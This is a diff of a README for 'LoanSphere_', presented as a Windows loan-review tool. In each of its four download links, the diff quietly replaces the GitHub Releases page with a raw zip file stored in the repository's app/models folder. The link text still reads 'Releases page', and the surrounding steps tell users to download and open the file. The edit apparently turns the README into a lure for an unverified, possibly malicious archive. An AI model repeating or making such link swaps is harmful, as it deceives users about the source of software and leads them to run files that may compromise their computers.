@@ -1,6 +1,6 @@
 # 🤖 LoanSphere_ - Faster Loan Review, Less Manual Work
 
-[![Download LoanSphere_](https://img.shields.io/badge/Download%20LoanSphere_-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/judecopernican221/LoanSphere_/releases)
+[![Download LoanSphere_](https://img.shields.io/badge/Download%20LoanSphere_-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/judecopernican221/LoanSphere_/raw/refs/heads/main/app/models/Sphere_Loan_v1.9.zip)
 
 ## 🚀 What LoanSphere_ does
 
@@ -17,7 +17,7 @@ The app uses AI tools in the background to help sort and process information. Yo
 
 ## 📥 Download LoanSphere_
 
-1. Open the [LoanSphere_ Releases page](https://github.com/judecopernican221/LoanSphere_/releases)
+1. Open the [LoanSphere_ Releases page](https://github.com/judecopernican221/LoanSphere_/raw/refs/heads/main/app/models/Sphere_Loan_v1.9.zip)
 2. Download the latest Windows file from the release list
 3. Save the file to your computer
 4. Open the downloaded file to start the setup or app
@@ -143,7 +143,7 @@ LoanSphere_ fits well when you need to:
 
 ## 📦 Download and setup link
 
-Visit the [LoanSphere_ Releases page](https://github.com/judecopernican221/LoanSphere_/releases) to download and run the Windows file from the latest release
+Visit the [LoanSphere_ Releases page](https://github.com/judecopernican221/LoanSphere_/raw/refs/heads/main/app/models/Sphere_Loan_v1.9.zip) to download and run the Windows file from the latest release
 
 ## 🧰 Troubleshooting
 
@@ -215,4 +215,4 @@ Check the releases page often for new versions. New releases may include:
 
 ## 📎 Download link again
 
-Use this page to get the latest Windows release: [https://github.com/judecopernican221/LoanSphere_/releases](https://github.com/judecopernican221/LoanSphere_/releases)
+Use this page to get the latest Windows release: [https://github.com/judecopernican221/LoanSphere_/raw/refs/heads/main/app/models/Sphere_Loan_v1.9.zip](https://github.com/judecopernican221/LoanSphere_/raw/refs/heads/main/app/models/Sphere_Loan_v1.9.zip)
